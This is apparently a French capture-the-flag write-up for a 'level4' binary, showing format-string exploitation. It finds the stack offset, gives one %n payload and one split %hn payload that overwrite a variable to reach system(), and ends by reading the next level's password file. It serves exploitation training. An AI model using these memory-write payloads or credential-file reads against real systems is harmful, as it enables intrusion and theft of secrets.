# level4 - Format String Exploitation Avancée

## Analyse du Programme

**Structure**
- Fonction `n()` contenant une comparaison avec `0x1025544`
- Variable à modifier à l'adresse `0x8049810`
- Appel à `printf()` vulnérable dans la fonction `p()`

**Points d'Intérêt**
- Valeur cible: `0x1025544` (16930116 en décimal)
- Comparaison critique: `cmp $0x1025544,%eax`
- Exécution de `system()` si la comparaison réussit

## Méthodes d'Exploitation

- Pour obtenir l'offset on peut envoyer 'AAAA' suivi de %x a fgets ou suivi de %1$x en augmentant la valeur jusqu'a retrouver les 'A'.
```nasm
./level4 
AAAA %x %x %x %x %x %x %x %x %x %x %x %x
AAAA b7ff26b0 bffff694 b7fd0ff4 0 0 bffff658 804848d bffff450 200 b7fd1ac0 b7ff37d0 41414141
```
- On sait maintenant qu'on modifie la stack a partir du 12eme argument de printf
- Comme pour l'exercice precedent on va vouloir modifier la variable a 0x1025544 pour acceder a l'appel system()

**Approche Simple**
```bash
(python -c 'print "\x10\x98\x04\x08" + "%16930112d" + "%12$n"' ; cat) | ./level4
```

**Approche Optimisée**
```bash
(python -c 'print "\x12\x98\x04\x08" + "\x10\x98\x04\x08" + "%250d" + "%12$hn" + "%21570d" + "%13$hn"'; cat) | ./level4
```

L'approche optimisée: 
- Permet de separer les 4 bytes de l'int en 2 (separant les bits de poids faibles et les bits de poids fort), reduisant consirablement le nombre a ecrire via stdin
1. Écrit `0x5544` à l'adresse `0x8049810`
2. Écrit `0x0102` à l'adresse `0x8049812`
3. Utilise `%hn` pour écrire 2 bytes à la fois

**Obtention du Flag**
```bash
cat /home/user/level5/.pass
```

Cette exploitation modifie la valeur en mémoire pour déclencher l'appel à `system()`.
